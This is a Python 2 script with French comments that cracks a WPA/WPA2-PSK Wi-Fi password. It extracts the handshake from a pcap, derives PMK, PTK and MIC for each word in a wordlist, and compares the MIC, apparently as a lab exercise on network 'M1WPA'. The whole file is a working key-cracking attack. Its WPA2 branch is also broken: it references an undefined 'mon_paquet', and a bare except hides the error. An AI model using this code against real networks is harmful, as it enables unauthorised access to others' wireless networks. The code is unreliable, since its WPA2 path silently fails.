#!/usr/bin/python
# coding: utf-8
from scapy.all import *
from subprocess import *
import hmac,hashlib,binascii,string,itertools,codecs
from pbkdf2 import PBKDF2
from scapy_eap import WPA_key 

cap=rdpcap("capture_wpa.pcap")
#Recuperation des data de la capture wireshark
mac_station=cap[1].addr1.replace(':','').decode("hex")
print "mac_station :",mac_station.encode("hex")
mac_PointAcces=cap[1].addr2.replace(":","").decode("hex")
print "mac_PointAcces :", mac_PointAcces.encode("hex")
nonce_station=cap[2][EAPOL].nonce.encode("hex")
print"Nonce station :",nonce_station
nonce_PointAcces=cap[3][EAPOL].nonce.encode("hex")
print"Nonce PointAcc:",nonce_PointAcces
mic_cap=cap[4][EAPOL].wpa_key_mic
print"Mic capture:",mic_cap.encode("hex")

#Fonction qui calcule  la PRF
def PRF512(key, A, B):
#Nombre d'octets dans le PTK
   nb_octet = 64
   i = 0
   R = ''
   #Chaque itération produit une valeur de 160 bits et 512 bits sont requis.
   while(i <= ((nb_octet * 8 + 159) / 160)):
   	hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
   	R = R + hmacsha1.digest()
   	i += 1
   return R[0:nb_octet]
# Définir des paramètres pour la génération du PTK
def Generer_AB(nonce_PointAcces, nonce_station, mac_PointAcces, mac_station):
    A =b"Pairwise key expansion"
    B=min(mac_station,mac_PointAcces)+max(mac_station,mac_PointAcces)+min(nonce_station,nonce_PointAcces)+max(nonce_station,nonce_PointAcces)
    return (A, B)

SSID= "M1WPA"
nonce_station=nonce_station.decode("hex")
nonce_PointAcces=nonce_PointAcces.decode("hex")
p=cap[4][EAPOL]
p.wpa_key_mic = ''

#Ps : On as  changé  l'ordre  du aaaababa dans le fichier  pour la rapidité de l'execution
with open('combinaisons.txt') as f:
    mot_de_passe=''
    #on utilise MD5 si la  capture  est wpa-psk
    if(cap[4][EAPOL].key_descriptor_Version==1):
    	print "En cours de chercher le bon mot de passe du reseau wpa-psk..."
        for line in f.readlines():
            supposed_pass = line.strip('\n')
             #print(supposed_pass
            try:
                #pour générer une valeur de 32 octets
                pmk=PBKDF2(supposed_pass.encode('ascii'),SSID.encode(),4096)
                PMK=pmk.read(32)
                #generation paramètres pour la génération du PTK
                (A,B)=Generer_AB(nonce_PointAcces,nonce_station,mac_PointAcces,mac_station)
                #Generation la clé transitoire par paire (PTK)
                PTK=PRF512(PMK,A,B)
                #generation de la KCK a partir  de la PTK
                KCK=(PTK[0:16])
                #generation de  la MIC
                mic = hmac.new(KCK,str(p),hashlib.md5).digest().encode("hex")
                if(mic==mic_cap.encode("hex")):
                    mot_de_passe=supposed_pass
                    break
            except :
                pass
        #on utilise sha1 si wpa2-psk
    else:
    	print "En cours de chercher le bon mot de passe du reseau wpa2-psk..." 
        for line in f.readlines():
            supposed_pass = line.strip('\n')
             #print(supposed_pass
            try:
                #pour générer une valeur de 32 octets
                pmk=PBKDF2(supposed_pass.encode('ascii'),SSID.encode(),4096)
                PMK=pmk.read(32)
                #generation paramètres pour la génération du PTK

                (A,B)=Generer_AB(nonce_PointAcces,nonce_station,mac_PointAcces,mac_station)
                #Generation la clé transitoire par paire (PTK)
                PTK=PRF512(PMK,A,B)
                #generation de la KCK a partir  de la PTK
                KCK=(PTK[0:16])
                #generation de  la MIC
                mic = hmac.new(KCK,str(mon_paquet),hashlib.sha1).digest().encode("hex")
                if(mic==mic_cap.encode("hex")):
                    mot_de_passe=supposed_pass
                    break
            except :
                pass
    if(mot_de_passe!=''):
        print  "Mot de passe trouvé:",mot_de_passe
    else:   
        print "le mot de passe n'existe pas  dans le dictionnaire"